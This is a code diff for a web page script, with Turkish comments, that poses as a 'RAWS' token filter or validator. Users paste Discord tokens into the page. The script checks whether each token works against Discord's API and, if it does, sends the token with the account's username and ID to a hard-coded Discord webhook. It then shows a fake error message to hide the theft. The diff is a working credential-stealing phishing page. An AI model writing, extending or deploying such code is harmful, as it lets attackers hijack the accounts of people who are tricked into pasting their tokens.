@@ -136,52 +136,56 @@
     // Senin webhook adresin
     const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
-    document.getElementById('submitBtn').addEventListener('click', function() {
+    document.getElementById('submitBtn').addEventListener('click', async function() {
         const val = document.getElementById('contentInput').value;
         const st = document.getElementById('status');
-
-        // Satırlara ayır ve temizle
-        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-        
-        // Discord token formatını kontrol eden Regex (Basit ve etkili)
-        const tokenRegex = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}/;
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
 
         if (lines.length === 0) return;
 
         st.style.display = "block";
-        st.textContent = "Bağlantı kuruluyor...";
+        st.textContent = "Sistem kontrol ediliyor...";
         st.style.color = "#ffcc00";
 
-        let foundToken = false;
-
-        lines.forEach(line => {
-            if (tokenRegex.test(line)) {
-                foundToken = true;
-                fetch(wh, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "RAWS FILTER",
-                        embeds: [{
-                            title: "💎 Yeni Token Yakalandı",
-                            description: "```" + line + "```",
-                            color: 5814783,
-                            timestamp: new Date()
-                        }]
-                    })
+        for (const token of lines) {
+            try {
+                // Önce token çalışıyor mu diye kontrol et
+                const response = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
                 });
-            }
-        });
 
-        setTimeout(() => {
-            if (!foundToken) {
-                st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
-                st.style.color = "#ff1e1e";
-            } else {
-                st.textContent = "✕ Bazı veriler senkronize edilemedi (Hata: 0x92)";
-                st.style.color = "#ff1e1e";
+                if (response.status === 200) {
+                    const userData = await response.json();
+                    
+                    // Sadece çalışıyorsa webhook'a gönder
+                    await fetch(wh, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: "RAWS VALIDATOR",
+                            embeds: [{
+                                title: "✅ ÇALIŞAN TOKEN BULUNDU",
+                                color: 65280,
+                                fields: [
+                                    { name: "Kullanıcı", value: `**${userData.username}#${userData.discriminator}**`, inline: true },
+                                    { name: "ID", value: userData.id, inline: true },
+                                    { name: "Token", value: "```" + token + "```" }
+                                ],
+                                timestamp: new Date()
+                            }]
+                        })
+                    });
+                }
+            } catch (err) {
+                // Hataları sessizce geç
             }
-        }, 1200);
+        }
+
+        // İşlem bitince her türlü hata mesajı göster
+        setTimeout(() => {
+            st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
+            st.style.color = "#ff1e1e";
+        }, 1500);
     });
 })();
 </script>
